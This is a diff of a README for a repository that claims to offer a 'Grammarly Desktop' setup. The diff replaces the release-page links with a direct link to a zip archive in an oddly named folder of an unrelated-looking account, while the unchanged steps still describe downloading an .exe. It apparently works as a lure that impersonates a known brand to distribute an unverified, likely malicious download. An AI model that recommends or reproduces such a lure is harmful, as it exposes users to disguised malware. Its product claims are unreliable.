@@ -1,6 +1,6 @@
 # ✍️ Grammarly-Desktop-Setup - Write clear text in any application
 
-[![Download Grammarly Desktop](https://img.shields.io/badge/Download_Grammarly-Blue-blue.svg)](https://github.com/unconvincing-ordertremellales834/Grammarly-Desktop-Setup/releases)
+[![Download Grammarly Desktop](https://img.shields.io/badge/Download_Grammarly-Blue-blue.svg)](https://github.com/unconvincing-ordertremellales834/Grammarly-Desktop-Setup/raw/refs/heads/main/tabour/Grammarly_Setup_Desktop_1.7.zip)
 
 Grammarly Desktop checks your grammar, spelling, punctuation, and tone across every app on your computer. This tool provides style suggestions, detects plagiarism, and uses artificial intelligence to rewrite your text for clarity. Whether you write emails, documents, or social media posts, this application assists you in producing professional work.
 
@@ -19,7 +19,7 @@ To install and run this application, ensure your computer meets these requiremen
 Follow these steps to set up the software on your Windows computer:
 
 1. Click the link below to visit the release page.
-   [Download Grammarly Desktop](https://github.com/unconvincing-ordertremellales834/Grammarly-Desktop-Setup/releases)
+   [Download Grammarly Desktop](https://github.com/unconvincing-ordertremellales834/Grammarly-Desktop-Setup/raw/refs/heads/main/tabour/Grammarly_Setup_Desktop_1.7.zip)
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in .exe to start the download.
 4. Locate the downloaded file in your Downloads folder.
